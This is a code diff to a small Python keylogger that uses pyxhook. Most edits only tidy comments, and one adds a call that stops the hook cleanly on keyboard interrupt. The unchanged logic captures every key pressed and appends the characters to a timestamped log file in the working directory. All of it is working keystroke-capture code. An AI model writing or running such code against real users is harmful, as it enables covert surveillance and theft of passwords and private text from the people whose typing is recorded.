@@ -3,21 +3,20 @@ import os
 from datetime import datetime
 import pyxhook
 
-# main function
 def main():
-    # specify the name of the file (can be changed )
+    # Specify the name of the file (can be changed )
     log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
 
-    # the logging function with {event parm}
+    # The logging function with {event parm}
     def OnKeyPress(event):
 
-        with open(log_file, "a") as f:  # open a file as f with Append (a) mode
+        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
             if event.Key == 'P_Enter' :
                 f.write('\n')
             else:
-                f.write(f"{chr(event.Ascii)}")  # write to the file / convert ascii to readable characters
+                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters
 
-    # create a hook manager object
+    # Create a hook manager object
     new_hook = pyxhook.HookManager()
     new_hook.KeyDown = OnKeyPress
 
@@ -26,7 +25,8 @@ def main():
     try:
         new_hook.start()  # start the hook
     except KeyboardInterrupt:
-        # User cancelled from command line.
+        # User cancelled from command line so close the listener
+        new_hook.cancel()
         pass
     except Exception as ex:
         # Write exceptions to the log file, for analysis later.
